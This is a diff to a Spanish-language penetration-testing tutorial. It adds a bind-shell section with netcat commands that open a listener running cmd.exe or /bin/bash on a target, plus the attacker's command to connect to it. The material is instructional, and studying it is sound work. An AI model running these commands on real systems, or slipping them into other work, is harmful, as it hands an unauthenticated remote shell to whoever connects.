@@ -91,4 +91,20 @@ Una de las principales limitaciones de este modelo reside en la necesidad de que
 
 ![img](../img/bindshell.png)
 
+En el lado del objetivo necesitamos crear un netcat listener que permita la ejecución de programas:
+
+```bash
+# Windows
+nc -nvlp <Puerto> -e cmd.exe
+
+# Linux
+nc -nvlp <Puerto> -c /bin/bash
+```
+
+El el lado atacante simplemente iniciamos una conexión, que si es válida, ejecutará el programa dando acceso a una consola.
+
+```bash
+nc -nv <IP> <Puerto>
+```
+
 ## Reverse shell
